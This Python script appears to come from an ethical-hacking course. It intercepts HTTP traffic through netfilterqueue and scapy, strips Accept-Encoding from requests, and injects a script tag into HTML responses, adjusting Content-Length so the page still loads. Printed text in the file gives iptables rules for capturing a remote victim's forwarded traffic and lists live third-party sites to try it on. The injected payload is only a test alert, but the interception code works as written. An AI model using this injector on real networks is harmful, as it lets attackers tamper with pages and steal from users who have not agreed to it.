#!/usr/bin/python
import netfilterqueue
import scapy.all as scapy
import re

ack_list = []

print("Website To Test: http://startrinity.com/HttpTester/HttpRestApiClientTester.aspx")
print(
    "For remote Computer\niptables -I FORWARD -j NFQUEUE --queue-num 0\nFor my Computer\niptables -I OUTPUT -j NFQUEUE --queue-num 0\niptables -I INPUT -j NFQUEUE --queue-num 0")

print("""
If you observe, you'll see that speedbit.com is an HTTP site whereas bing.com has upgraded to HTTPS. Since bing.com was an HTTP site at the time when this course was recorded, Zaid Sir was able to manipulate it. He mentions this several times in the course too.

If you wish to, here are a few other websites that work on HTTP:

1. http://www.furnomech.com/
2. https://diabeticretinopathy.org.uk/
3. http://www.vulnweb.com/
""")


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.Raw):
        try:
            load = scapy_packet[scapy.Raw].load.decode()
            if scapy_packet[scapy.TCP].dport == 80:
                print("[+] Request")
                print(scapy_packet.show())
                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
            elif scapy_packet[scapy.TCP].sport == 80:
                print("[+] Response")
                print(scapy_packet.show())
                injection_code = "<script>alert('test');</script>"
                load = load.replace("</body>", injection_code + "</body>")
                content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
                if content_length_search and "text/html" in load:
                    content_length = content_length_search.group(1)
                    new_content_length = int(content_length) + len(injection_code)
                    print(new_content_length)
                    load = load.replace(content_length, str(new_content_length))
            if load != scapy_packet[scapy.Raw].load:
                modified_packet = set_load(scapy_packet, load)
                packet.set_payload(bytes(modified_packet))

        except UnicodeDecodeError:
            pass

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
